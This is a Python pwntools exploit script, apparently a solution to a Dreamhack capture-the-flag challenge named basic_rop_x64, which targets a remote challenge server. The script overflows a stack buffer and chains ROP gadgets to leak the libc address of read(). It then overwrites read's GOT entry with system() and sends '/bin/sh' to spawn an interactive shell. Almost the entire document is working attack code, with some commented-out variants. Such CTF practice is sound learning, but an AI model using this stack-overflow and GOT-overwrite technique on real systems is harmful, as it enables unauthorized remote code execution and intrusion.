from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

context.log_level = 'debug'

p = remote("host1.dreamhack.games", 14261)
# p = process("./basic_rop_x64")
e = ELF("./basic_rop_x64")

# gdb.attach(p)

buf2sfp = 0x40+0x8
pop_rdi = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881
ret2main = 0x00000000004007bb

# [3] Get offset of system
libc = ELF("./libc.so.6")
readtosystem = libc.symbols["read"]-libc.symbols["system"]
slog("read2System", readtosystem)

read_got = e.got["read"]
read_plt = e.plt["read"]
puts_plt = e.plt["puts"]

payload = b"A"*buf2sfp
# for get read() address - exploit : puts() call
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt) # puts(read_got) read() address print not call read()

payload += p64(ret2main)
# for read() <- system()
# payload += p64(pop_rdi)
# payload += p64(0)
# payload += p64(pop_rsi_r15)
# payload += p64(read_got)
# payload += p64(0)
# payload += p64(read_plt)


p.send(payload)
p.recvn(0x40)
read_addr = u64(p.recvn(6)+b"\x00"*2)
slog("read()", read_addr)

libc_base = read_addr - libc.symbols["read"]
slog("read offset", libc.symbols["read"])
slog("system offset", libc.symbols["system"])
slog("lb", libc_base)

system_addr = libc_base + libc.symbols["system"]
slog("system()", system_addr)

# #insert system("/bin/sh")
# justret = 0x00000000004005a9
# payload += p64(justret)

payload = b"A"*buf2sfp
# read("/bin/sh") == system("/bin/sh")
# read(0, [read_got], 0x10)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
# payload += p64(read_got) + p64(0x10)
payload += p64(read_got) + p64(0)
# ret2main_read = 0x0000000000400769
# payload += p64(ret2main_read)
payload += p64(read_plt)
# read input is uhm...

# system("/bin/sh")
# payload += p64(justret)
payload += p64(pop_rdi)
payload += p64(read_got+0x8) #"/bin/sh"
payload += p64(read_plt) #[read_got] == system()

p.send(payload)
p.recvn(0x40)

p.send(p64(system_addr)+b"/bin/sh\x00")

p.interactive()